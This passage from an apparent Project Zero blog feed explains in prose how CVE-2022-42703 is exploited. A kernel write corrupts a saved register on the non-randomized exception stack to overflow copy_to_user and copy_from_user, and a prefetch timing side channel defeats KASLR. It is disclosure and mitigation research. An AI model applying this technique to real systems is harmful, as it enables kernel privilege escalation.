baseline; white-space: pre-wrap;"> values. Assuming this code is operating on inert and unchanging memory, it will increment </span><span style="background-color: #b4a7d6; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">sem-&gt;count</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> by 0x100 if the 3 least significant bits and the most significant bit are all unset. That means it is difficult to modify a kernel pointer and we cannot modify any non 8-byte aligned values (as theyll have one or more of the bottom three bits set). Additionally, this semaphore is later unlocked, causing whatever write we perform to be reverted in the imminent future. Furthermore, at this point we dont have an established strategy for determining the KASLR slide nor figuring out the addresses of any objects we might want to overwrite with our newfound primitive. It turns out that regardless of any randomization the kernel presently has in place, theres a straightforward strategy for exploiting this bug even given such a constrained arbitrary write.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Stack corruption</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">On x86-64 Linux, when the CPU performs certain interrupts and exceptions, it will swap to a respective stack that is mapped to a static and non-randomized virtual address, with a different stack for the different exception types. A brief documentation of those stacks and their parent structure, the </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">cpu_entry_area</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">, can be found </span><a href="https://docs.kernel.org/x86/pti.html" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">here.</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> These stacks are most often used on entry into the kernel from userland, but theyre used for exceptions that happen in kernel mode as well. Weve recently seen </span><a href="https://google.github.io/kctf/vrp.html" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">KCTF</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> entries where attackers take advantage of the non-randomized </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">cpu_entry_area</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> stacks in order to access data at a known virtual address in kernel accessible memory even in the presence of SMAP and KASLR. You could also use these stacks to forge attacker-controlled data at a known kernel virtual address. This works because the attacker tasks general purpose register contents are pushed directly onto this stack when the switch from userland to kernel mode occurs due to one of these exceptions. This also occurs when the kernel itself generates an Interrupt Stack Table exception and swaps to an exception stack - except in that case, kernel GPRs are pushed instead. These pushed registers are later used to restore kernel state once the exception is handled. In the case of a userland triggered exception, register contents are restored from the task stack.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">One example of an IST exception is a DB exception which can be triggered by an attacker via a hardware breakpoint, the associated registers of which are described </span><a href="https://pdos.csail.mit.edu/6.828/2004/readings/i386/s12_02.htm" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">here</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. Hardware breakpoints can be triggered by a variety of different memory access types, namely reads, writes, and instruction fetches. These hardware breakpoints can be set using </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">ptrace(2)</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">, and are preserved during kernel mode execution in a task context such as during a syscall. That means that its possible for an attacker-set hardware breakpoint to be triggered in kernel mode, e.g. during a </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">copy_to</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">/</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">from_user</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> call. The resulting exception will save and restore the kernel context via the aforementioned non-randomized exception stack, and that kernel context is an exceptionally good target for our arbitrary write primitive.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Any of the registers that </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">copy_to</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">/</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">from_user</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> is actively using at the time it handles the hardware breakpoint are corruptible by using our arbitrary-write primitive to overwrite their saved values on the exception stack. In this case, the size of the </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">copy_user</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> call is the intuitive target. The size value is consistently stored in the </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">rcx</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> register, which will be saved at the same virtual address every time the hardware breakpoint is hit. After corrupting this saved register with our arbitrary write primitive, the kernel will restore </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">rcx</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> from the exception stack once it returns back to </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">copy_to</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">/</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">from_user</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. Since </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">rcx</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> defines the number of bytes </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">copy_user</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> should copy, this corruption will cause the kernel to illicitly copy too many bytes between userland and the kernel.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">begets stack corruption</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The attack strategy starts as follows:</span></p><ol style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;"><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Fork a process Y from process X.</span></p></li><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Process X ptraces process Y, then sets a hardware breakpoint at a known virtual address [addr] in process Y.</span></p></li><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Process Y makes a large number of calls to uname(2), which calls </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">copy_to_user</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> from a kernel stack buffer to [addr]. This causes the kernel to constantly trigger the hardware watchpoint and enter the DB exception handler, using the DB exception stack to save and restore </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">copy_to_user</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> state</span></p></li><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Simultaneously make many arbitrary writes at the known location of the DB exception stacks saved </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">rcx</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> value, which is Process Ys </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">copy_to_user</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">s saved length.</span></p></li></ol><div><span style="font-family: Arial;"><span style="font-size: 14.6667px; white-space: pre-wrap;"><br /></span></span></div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8tz1hKWNhX-Wy3WfWRQpXpx20G62eGw7d8a_Kw7qQFfGyAgn6jsE9yxyFRR7hgrTW04cZDfp-V1BUnNqbFTXm9rFEktXTvf70fyPgAOk1pMgWZPzLBcRDND3bFObstL6cmPhp0J6nReczPiODwfsjecw_VsmRTp8cgodf-SEb1aQNkfQMQiPnHtt2/s1111/image3.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img alt="DB Exception handling while the arbitrary write primitive writes to the CEA stack leads to corruption of the rcx register" border="0" data-original-height="1111" data-original-width="881" height="640" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8tz1hKWNhX-Wy3WfWRQpXpx20G62eGw7d8a_Kw7qQFfGyAgn6jsE9yxyFRR7hgrTW04cZDfp-V1BUnNqbFTXm9rFEktXTvf70fyPgAOk1pMgWZPzLBcRDND3bFObstL6cmPhp0J6nReczPiODwfsjecw_VsmRTp8cgodf-SEb1aQNkfQMQiPnHtt2/w508-h640/image3.png" width="508" /></a></div><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt; text-align: center;"><br /></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The DB exception stack is used rarely, so its unlikely that we corrupt any unexpected kernel state via a spurious DB exception while spamming our arbitrary write primitive. The technique is also racy, but missing the race simply means corrupting stale stack-data. In that case, we simply try again. In my experience, it rarely takes more than a few seconds to win the race successfully.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Upon successful corruption of the length value, the kernel will copy much of the current tasks stack back to userland, including the task-local stack cookie and return addresses. We can subsequently invert our technique and attack a </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">copy_from_user</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> call instead. Instead of copying too many bytes from the kernel task stack to userland, we elicit the kernel to copy too many bytes from userland to the kernel task stack! Again we use a syscall, </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">prctl(2)</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">, that performs a </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">copy_from_user</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> call to a kernel stack buffer. Now by corrupting the length value, we generate a stack buffer overflow condition in this function where none previously existed. Since weve already leaked the stack cookie and the KASLR slide, it is trivially easy to bypass both mitigations and overwrite the return address.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><br /></span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt; text-align: center;"></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYUmx3piEZB098RyCbjYgbTv18WhcOGwlD3J7HitFqympFWvbVS6iGvsBjdJLgZ5TFc6Y7I4QjugrzV78LCziyAkFMOUgvgDHP_OuPx32gSP5cvrqEV5G2eHqGFzsAHTspIaJ15Dql9ubkcGX6ZQ20NRe9J-cIsLM2y7FEg5CmIICJqoiakOzcYnqT/s555/image2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img alt="Image showing that weve gained control of the instruction pointer" border="0" data-original-height="365" data-original-width="555" height="420" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYUmx3piEZB098RyCbjYgbTv18WhcOGwlD3J7HitFqympFWvbVS6iGvsBjdJLgZ5TFc6Y7I4QjugrzV78LCziyAkFMOUgvgDHP_OuPx32gSP5cvrqEV5G2eHqGFzsAHTspIaJ15Dql9ubkcGX6ZQ20NRe9J-cIsLM2y7FEg5CmIICJqoiakOzcYnqT/w640-h420/image2.png" width="640" /></a></div><br /><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><br /></span><p></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; white-space: pre-wrap;">Completing a ROP chain for the kernel is left as an exercise to the reader.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Fetching the KASLR slide with prefetch</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Upon reporting this bug to the Linux kernel security team, our suggestion was to start randomizing the location of the percpu </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">cpu_entry_area</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> (CEA), and consequently the associated exception and syscall entry stacks. This is an effective mitigation against remote attackers but is insufficient to prevent a local attacker from taking advantage. 6 years ago, Daniel Gruss et al. </span><a href="https://gruss.cc/files/prefetch.pdf" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">discovered a new more reliable technique for exploiting the TLB timing side channel in x86 CPUs</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. Their results demonstrated that prefetch instructions executed in user mode retired at statistically significant different latencies depending on whether the requested virtual address to be prefetched was mapped vs unmapped, even if that virtual address was only mapped in kernel mode. </span><a href="https://docs.kernel.org/x86/pti.html" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">kPTI</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> was helpful in mitigating this side channel, however, most modern CPUs now have innate protection for Meltdown, which kPTI was specifically designed to address, and thusly kPTI (which has significant performance implications) is disabled on modern microarchitectures. That decision means it is once again possible to take advantage of the prefetch side channel to defeat not only KASLR, but also the CPU entry area randomization mitigation, preserving the viability of the CEA stack corruption exploit technique against modern X86 CPUs.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">There are surprisingly few fast and reliable examples of this prefetch KASLR bypass technique available in the open source realm, so I made the decision to write one.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Implementation</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The meat of implementing this technique effectively is in serially reading the processors time stamp counter before and after performing a prefetch. </span><a href="https://github.com/IAIK/prefetch" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">Daniel Gruss helpfully provided highly effective and open source code for doing just that.</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> The only edit I made (as suggested by Jann Horn) was to swap to using </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">lfence</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> instead of </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">cpuid</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> as the serializing instruction, as </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">cpuid</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> is emulated in VM environments. It also became apparent in practice that there was no need to perform any cache-flushing routines in order to witness the side-channel effect. It is simply enough to time every prefetch attempt.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Generating prefetch timings for all 512 possible KASLR slots yields quite a bit of fuzzy data in need of analyzing. To minimize noise, multiple samples of each tested address are taken, and the minimum value from that set of samples is used in the results as the representative value for an address. On the Tiger Lake CPU this test was primarily performed on, no more than 16 samples per slot were needed to generate exceptionally reliable results. Low-resolution minimum prefetch time slot identification narrows down the area to search in while avoiding false positives for the higher resolution edge-detection code which finds the precise address at which prefetch dramatically drops in run-time. The result of this effort is a PoC which can correctly identify the KASLR slide on my local machine with 99.999% accuracy (95% accuracy in a VM) while running faster than it takes to grep through kallsyms for the kernel base address:</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><br /></span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt; text-align: center;"></p><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgE360QpgSL2MstPC7ytC_a22fGUz2uwugoUW0sKHq66aCHk7loOvFCrxAs0ePlNIzvdutTS4wmV5Ilfz2u8MLuQd-n5Z_fSHMcfQdIj-8ooyABpDomHKbxQuCLT3REttBscYj9_F4eGBfKniEm99z4p-ta10N6cXy6nIoGLBV1y8aNn_DiqHBuzVTO/s891/image1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img alt="Breaking KASLR with Prefecth: Grepping through kallsyms took .077 seconds while using the prefetch technique took .013 seconds" border="0" data-original-height="306" data-original-width="891" height="220" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgE360QpgSL2MstPC7ytC_a22fGUz2uwugoUW0sKHq66aCHk7loOvFCrxAs0ePlNIzvdutTS4wmV5Ilfz2u8MLuQd-n5Z_fSHMcfQdIj-8ooyABpDomHKbxQuCLT3REttBscYj9_F4eGBfKniEm99z4p-ta10N6cXy6nIoGLBV1y8aNn_DiqHBuzVTO/w640-h220/image1.png" width="640" /></a></div><br /><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><br /></span><p></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">This prefetch code does indeed work to find the locations of the randomized CEA regions in Peter Ziljstras proposed patch. However, the journey to that point results in code that demonstrates another deeply significant issue - KASLR is comprehensively compromised on x86 against local attackers, and has been for the past several years, and will be for the indefinite future. There are presently no plans in place to resolve the myriad microarchitectural issues that lead to side channels like this one. Future work is needed in this area in order to preserve the integrity of KASLR, or alternatively, it is probably time to accept that KASLR is no longer an effective mitigation against local attackers and to develop defensive code and mitigations that accept its limitations.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Conclusion</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">This exploit demonstrates a highly reliable and agnostic technique that can allow a broad spectrum of uncontrolled arbitrary write primitives to achieve kernel code execution on x86 platforms. While it is possible to mitigate this exploit technique from a remote context, an attacker in a local context can utilize known microarchitectural side-channels to defeat the current mitigations. Additional work in this area might be valuable to continue to make exploitation more difficult, such as performing in-stack randomization so that the stack offset of the saved state changes on every taken IST exception. For now however, this remains a viable and powerful exploit strategy on x86 Linux.</span></p><div><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><br /></span></div></span>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/2515628030502752973/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/2515628030502752973
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/2515628030502752973
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html
## @title
Exploiting CVE-2022-42703 - Bringing back the stack attack
## author
## name
Google Project Zero
## uri
http://www.blogger.com/profile/08975904405228580347
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8tz1hKWNhX-Wy3WfWRQpXpx20G62eGw7d8a_Kw7qQFfGyAgn6jsE9yxyFRR7hgrTW04cZDfp-V1BUnNqbFTXm9rFEktXTvf70fyPgAOk1pMgWZPzLBcRDND3bFObstL6cmPhp0J6nReczPiODwfsjecw_VsmRTp8cgodf-SEb1aQNkfQMQiPnHtt2/s72-w508-h640-c/image3.png
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-7519748497805371118
## published
22/11/2022 18:05:00
## updated
22/11/2022 18:05:40
## title
## @type
text
## #text
Mind the Gap
## content
## @type
html
## #text
